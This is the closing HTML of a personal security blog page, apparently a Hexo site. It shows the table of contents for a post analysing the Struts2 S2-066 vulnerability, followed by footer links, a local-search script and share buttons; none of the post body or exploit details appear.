+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-text"> 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text"> 影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E7%89%88%E6%9C%AC"><span class="toc-text"> 修复版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text"> 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text"> 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text"> 漏洞修复</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/ki10Moc/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="ki10Moc1949@gmail.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100083345720708">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ki10moc1/status/1494844731544662019?s=21&t=l-0lygAzRMHeJeBklnPt-A">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">Copyright © 2025 ki10Moc</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">霍布斯鲍姆学徒 | CTFer</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + S2-066%E5%88%86%E6%9E%90 + '&url=' + https%3A%2F%2Fki10moc.github.io%2F2023%2F12%2F11%2FS2-066%25E5%2588%2586%25E6%259E%2590%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ki10moc.github.io/2023/12/11/S2-066%E5%88%86%E6%9E%90/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
